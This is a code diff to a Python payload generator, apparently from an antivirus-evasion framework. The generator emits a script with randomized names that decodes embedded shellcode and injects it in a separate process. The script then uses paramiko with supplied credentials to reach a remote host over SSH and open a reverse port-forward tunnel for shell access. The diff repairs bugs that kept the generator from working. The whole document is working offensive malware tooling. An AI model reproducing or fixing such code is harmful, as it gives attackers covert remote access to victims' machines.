@@ -46,7 +46,6 @@ class Payload:
 		rfwtunnel_func = helpers.randomString()
 		main2_func = helpers.randomString()
 
-
 		imports = "from socket import *\nimport paramiko\nimport multiprocessing\nimport time\nimport subprocess"
 		imports += "\nimport ctypes\nimport thread\nimport threading\nimport select\n"
 
@@ -59,7 +58,7 @@ class Payload:
 		rhost_var = helpers.randomString()
 		port_var = helpers.randomString()
 
-		main += "if __name__ == '__main__':"
+		main = "if __name__ == '__main__':"
 		main += "\n\tmultiprocessing.freeze_support()"
 		main += "\n\t%s = r'%s'" % (shellcode_var, Shellcode)
 		main += "\n\t%s = %s.decode('string_escape')" % tuple([shellcode_var]*2)
@@ -68,7 +67,7 @@ class Payload:
 		main += "\n\ttime.sleep(2)"
 		main += "\n\t%s = multiprocessing.Process(target=%s, args=(%s,))" % (p_var, inject_func, shellcode_var)
 		main += "\n\t%s = []" % jobs_var
-		main += "\n\t%s.append()" % (jobs_var, p_var)
+		main += "\n\t%s.append(%s)" % (jobs_var, p_var)
 		main += "\n\t%s.start()" % p_var
 		main += "\n\t%s = '%s'" % (user_var, self.required_options["SSHUSER"][0])
 		main += "\n\t%s = '%s'" % (password_var, self.required_options["SSHPASS"][0])
@@ -77,7 +76,6 @@ class Payload:
 		main += "\n\ttime.sleep(3)"
 		main += "\n\tthread.start_new_thread(%s,(%s, %s, %s, %s, %s))\n" % (main2_func, user_var, password_var, rhost_var, port_var, shellport_var)
 
-		
 		shellport_var = helpers.randomString()
 		user_var = helpers.randomString()
 		password_var = helpers.randomString()
@@ -96,13 +94,13 @@ class Payload:
 		main2 += "\n\twhile True:"
 		main2 += "\n\t\ttry:" 
 		main2 += "\n\t\t\t%s.connect(%s[0], %s[1], username=%s, key_filename=None, look_for_keys=False, password=%s)" % (client_var, server_var, server_var, user_var, password_var)
-        main2 += "\n\t\texcept Exception:"
-        main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)"
-        main2 += "\n\t\telse: break"
-        main2 += "\n\t\ttry:"
-        main2 += "\n\t\t\t%s(int(%s), %s[0], %s[1], %s.get_transport())" % (rfwtunnel_func, shellport_var, remote_var, remote_var, client_var)
-        main2 += "\n\t\texcept Exception:"
-        main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)"
+		main2 += "\n\t\texcept Exception:"
+		main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)"
+		main2 += "\n\t\telse: break"
+		main2 += "\n\t\ttry:"
+		main2 += "\n\t\t\t%s(int(%s), %s[0], %s[1], %s.get_transport())" % (rfwtunnel_func, shellport_var, remote_var, remote_var, client_var)
+		main2 += "\n\t\texcept Exception:"
+		main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)"
 
 		shellcode_var = helpers.randomString()
 		ptr_var = helpers.randomString()
